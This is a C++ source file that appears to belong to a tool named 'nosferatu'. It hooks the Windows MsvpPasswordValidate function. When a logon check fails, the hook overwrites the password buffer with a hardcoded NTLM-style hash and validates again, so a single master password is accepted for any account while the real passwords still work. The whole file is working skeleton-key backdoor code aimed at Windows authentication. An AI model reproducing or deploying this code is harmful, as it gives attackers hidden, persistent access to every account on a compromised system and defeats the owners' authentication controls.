#include "pch.h"
#include "nosferatu.h"

BOOLEAN HookMSVPPValidate(BOOLEAN UasCompatibilityRequired, NETLOGON_LOGON_INFO_CLASS LogonLevel, PVOID LogonInformation, void* Passwords, PULONG UserFlags, PUSER_SESSION_KEY UserSessionKey, PVOID LmSessionKey)
{
	if (MsvpPasswordValidate(UasCompatibilityRequired, LogonLevel, LogonInformation, Passwords, UserFlags, UserSessionKey, LmSessionKey) == TRUE) {
		return TRUE;
	}
	else 
	{
		const unsigned char modHash[] = { 0x11,0xA5,0xCD,0x1A,0xF9,0xC5,0x82,0xA2,0x13,0x11,0xE0,0xEF,0x5A,0x92,0x1E,0x17 };
		for (int i = 0; i < 16; i++)
		{
			((unsigned char*)Passwords)[i] = modHash[i]; //overwriting with new hash byte
		}
		return MsvpPasswordValidate(UasCompatibilityRequired, LogonLevel, LogonInformation, Passwords, UserFlags, UserSessionKey, LmSessionKey);
	}
}